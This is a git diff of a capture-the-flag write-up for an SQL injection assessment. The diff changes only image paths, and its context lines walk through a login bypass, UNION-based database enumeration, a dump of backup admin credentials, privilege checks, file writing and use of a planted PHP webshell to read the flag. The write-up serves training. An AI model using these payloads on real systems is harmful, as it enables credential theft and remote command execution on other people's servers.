@@ -9,14 +9,14 @@ They provided a target IP address and no further information about their website
 
 Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!
 
-![](../images/Pasted%20image%2020250203155825.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203155825.png)
 
 # Bypassing the login page
 ---
 
 First thing we face is the login page, we can begin this assessment by checking the source code: `CTRL+U`:
 
-![](../images/Pasted%20image%2020250203155958.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203155958.png)
 
 They haven't forgotten about any credentials or anything related, next thing in mind is trying the most simple SQLI payload:
 
@@ -26,11 +26,11 @@ They haven't forgotten about any credentials or anything related, next thing in 
 
 We can try this in the username section:
 
-![](../images/Pasted%20image%2020250203160114.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203160114.png)
 
 To our surprise, we were able to successfully log in:
 
-![](../images/Pasted%20image%2020250203160137.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203160137.png)
 
 # Database enumeration
 ---
@@ -39,7 +39,7 @@ We can go along with our roleplay, this part is not strictly related to the path
 
 We are inside a dashboard panel, nothing seems off but the first thing we can notice is a search bar on the top right of the screen:
 
-![](../images/Pasted%20image%2020250203160237.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203160237.png)
 
 From previous modules, we found the way to enumerate the database, we can try the following:
 
@@ -54,15 +54,15 @@ We can enumerate the number of columns by using `ORDER BY`:
 
 We need to increase the number until we get an error specifying we're off the number of columns, let's automatize this by sending the request to burp's intruder and using it in the following way:
 
-![](../images/Pasted%20image%2020250203160644.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203160644.png)
 
 
 
-![](../images/Pasted%20image%2020250203160804.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203160804.png)
 
 After checking the responses we can see the following:
 
-![](../images/Pasted%20image%2020250203161026.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203161026.png)
 
 Error message starts in `6`, so, the number of columns is `5`.
 
@@ -79,7 +79,7 @@ cn' UNION select 1,@@version,3,4,5-- -
 
 We are using this since we know the number of columns, we'll get the following output:
 
-![](../images/Pasted%20image%2020250203161321.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203161321.png)
 
 So it indeed works, now we can begin to read the database:
 
@@ -89,7 +89,7 @@ cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
 
 We get the following:
 
-![](../images/Pasted%20image%2020250203161420.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203161420.png)
 
 The `backup` table seems interesting, we can check it out:
 
@@ -97,7 +97,7 @@ The `backup` table seems interesting, we can check it out:
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -
 ```
 
-![](../images/Pasted%20image%2020250203161536.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203161536.png)
 
 We see the following, `admin_bk`, we can enumerate the columns in `admin_bk` using this:
 
@@ -107,7 +107,7 @@ cn' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHE
 
 We will see the following:
 
-![](../images/Pasted%20image%2020250203162243.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203162243.png)
 
 Got `username` and `password`, let's read it:
 
@@ -115,7 +115,7 @@ Got `username` and `password`, let's read it:
 cn' UNION SELECT 1,username,password,4,5 FROM backup.admin_bk-- -
 ```
 
-![](../images/Pasted%20image%2020250203162347.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203162347.png)
 
 Got credentials:
 
@@ -139,7 +139,7 @@ We can check if we have high privileges with this:
 ' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -
 ```
 
-![](../images/Pasted%20image%2020250203163116.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203163116.png)
 
 We can check we got `Y`, which stands for yes, meaning we have privileges, in order to write files, three conditions must be there:
 
@@ -155,7 +155,7 @@ Let's check if `secure_file_priv` variable is not enabled:
 ' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
-![](../images/Pasted%20image%2020250203163254.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203163254.png)
 
 Value is empty, which means it is not enabled.
 
@@ -167,7 +167,7 @@ We can test writing with the following:
 
 If we visit `/proof.txt`, we can check the following:
 
-![](../images/Pasted%20image%2020250203163428.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203163428.png)
 
 We've written successfully, we can now write our webshell in the following way:
 
@@ -179,19 +179,19 @@ We can confirm it worked by going to:
 
 `http://IP:PORT/dashboard/webshell.php?0=id`
 
-![](../images/Pasted%20image%2020250203164153.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203164153.png)
 
 Let's list the `/` directory: `ls+/`
 
-![](../images/Pasted%20image%2020250203164320.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203164320.png)
 
 
 We can see the flag, we can simply read it by using `cat+/flag_cae1dadcd174.txt`
 
-![](../images/Pasted%20image%2020250203164435.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203164435.png)
 
 Got our flag: `528d6d9cedc2c7aab146ef226e918396`
 
 
-![](../images/Pasted%20image%2020250203164504.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250203164504.png)
 
